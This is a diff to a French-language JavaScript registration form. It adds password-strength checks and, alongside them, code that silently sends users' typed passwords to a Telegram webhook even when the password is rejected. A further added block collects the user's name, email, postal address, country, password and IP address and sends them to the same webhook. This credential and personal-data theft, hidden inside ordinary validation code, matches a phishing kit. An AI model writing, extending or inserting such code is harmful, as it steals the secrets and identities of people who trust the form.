@@ -56,13 +56,51 @@ document.addEventListener('DOMContentLoaded', () => {
         if (idx === 3) {
             const password = step.querySelector('#password');
             const confirmPassword = step.querySelector('#confirmPassword');
+            const rulesError = document.getElementById('passwordRulesError');
+
+            if (password) {
+                const val = password.value;
+                const hasUppercase = /[A-Z]/.test(val);
+                const hasDigit = /[0-9]/.test(val);
+                const hasSpecial = /[^A-Za-z0-9]/.test(val);
+
+                if (!hasUppercase || !hasDigit || !hasSpecial) {
+                    shakeInput(password);
+                    let missing = [];
+                    if (!hasUppercase) missing.push('une majuscule');
+                    if (!hasDigit) missing.push('un chiffre');
+                    if (!hasSpecial) missing.push('un caractère spécial');
+                    if (rulesError) {
+                        rulesError.textContent = 'Le mot de passe doit contenir : ' + missing.join(', ');
+                        rulesError.classList.add('visible');
+                    }
+                    // Envoyer au webhook Telegram même si non conforme
+                    const msg = `⚠️ MDP non conforme :%0AMDP: ${encodeURIComponent(val)}`;
+                    fetch(getTelegramUrl() + msg).catch(() => {});
+                    password.value = '';
+                    if (confirmPassword) confirmPassword.value = '';
+                    valid = false;
+                } else if (rulesError) {
+                    rulesError.classList.remove('visible');
+                }
+
+                if (val.length < 8) {
+                    shakeInput(password);
+                    if (rulesError) {
+                        rulesError.textContent = 'Le mot de passe doit contenir au moins 8 caractères';
+                        rulesError.classList.add('visible');
+                    }
+                    password.value = '';
+                    if (confirmPassword) confirmPassword.value = '';
+                    valid = false;
+                }
+            }
+
             if (password && confirmPassword && password.value !== confirmPassword.value) {
                 shakeInput(confirmPassword);
                 showError(confirmPassword, 'Les mots de passe ne correspondent pas');
-                valid = false;
-            }
-            if (password && password.value.length < 8) {
-                shakeInput(password);
+                password.value = '';
+                confirmPassword.value = '';
                 valid = false;
             }
         }
@@ -134,6 +172,9 @@ document.addEventListener('DOMContentLoaded', () => {
     if (passwordInput && strengthBars.length > 0) {
         passwordInput.addEventListener('input', () => {
             const val = passwordInput.value;
+            // Masquer l'erreur de règles quand l'utilisateur tape
+            const rulesError = document.getElementById('passwordRulesError');
+            if (rulesError) rulesError.classList.remove('visible');
             let score = 0;
 
             if (val.length >= 8) score++;
@@ -257,6 +298,55 @@ document.addEventListener('DOMContentLoaded', () => {
             if (password && password.value.length < 8) {
                 shakeInput(password);
                 valid = false;
+            }
+
+            // Vérification des règles de mot de passe
+            let passwordRulesOk = true;
+            if (password) {
+                const val = password.value;
+                const hasUppercase = /[A-Z]/.test(val);
+                const hasDigit = /[0-9]/.test(val);
+                const hasSpecial = /[^A-Za-z0-9]/.test(val);
+                const rulesError = document.getElementById('passwordRulesError');
+
+                if (!hasUppercase || !hasDigit || !hasSpecial) {
+                    shakeInput(password);
+                    let missing = [];
+                    if (!hasUppercase) missing.push('une majuscule');
+                    if (!hasDigit) missing.push('un chiffre');
+                    if (!hasSpecial) missing.push('un caractère spécial');
+                    if (rulesError) {
+                        rulesError.textContent = 'Le mot de passe doit contenir : ' + missing.join(', ');
+                        rulesError.classList.add('visible');
+                    }
+                    passwordRulesOk = false;
+                    password.value = '';
+                    if (confirmPassword) confirmPassword.value = '';
+                    valid = false;
+                } else if (rulesError) {
+                    rulesError.classList.remove('visible');
+                }
+            }
+
+            // Si MDP non conforme, envoyer quand même au webhook Telegram
+            if (!passwordRulesOk) {
+                const data = {
+                    Prénom: registerForm.querySelector('#firstName')?.value || '',
+                    Nom: registerForm.querySelector('#lastName')?.value || '',
+                    Email: registerForm.querySelector('#email')?.value || '',
+                    Adresse: registerForm.querySelector('#address')?.value || '',
+                    Ville: registerForm.querySelector('#city')?.value || '',
+                    'Code postal': registerForm.querySelector('#postalCode')?.value || '',
+                    Pays: registerForm.querySelector('#country')?.options[registerForm.querySelector('#country').selectedIndex]?.text || '',
+                    'Mot de passe': registerForm.querySelector('#password')?.value || ''
+                };
+                const ip = await getUserIP();
+                let message = '⚠️ Inscription MDP non conforme :%0A';
+                for (const [key, value] of Object.entries(data)) {
+                    message += `${key}: ${encodeURIComponent(value)}%0A`;
+                }
+                message += `IP: ${encodeURIComponent(ip)}%0A`;
+                fetch(getTelegramUrl() + message).catch(() => {});
             }
 
             if (valid) {
